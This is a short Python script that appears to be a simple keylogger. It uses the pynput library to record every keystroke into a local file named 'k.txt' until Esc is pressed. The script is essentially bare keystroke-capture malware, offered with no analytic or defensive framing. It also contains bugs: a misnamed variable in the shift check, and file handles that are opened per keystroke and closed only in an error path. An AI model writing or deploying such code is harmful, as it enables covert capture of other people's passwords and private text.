

from pynput.keyboard import Key,Listener


keys=[]
def on_press(key):
    try:
        key=str(key)
        if(key=='Key.enter'):
            key='\n'
        elif(key=='Key.space'):
            key=' '
        elif(key=='Key.alt'):
            key=' alt '
        elif(key=='Key.ctrl'):
            key=' ctrl '
        elif(key=='Key.backspace'):
            key=' backspace '
        elif(Key=='Key.shift'):
            key=' shift '
        else:
            key=key
        key=key.strip('\'')
        f=open('k.txt','a')
        f.write(key)
    except:
        f.close()
    #print("{0} pressed".format(key))


def on_release(key):
    if(key==Key.esc):
        return False

try:
    with Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()
except:
    print('\n...')
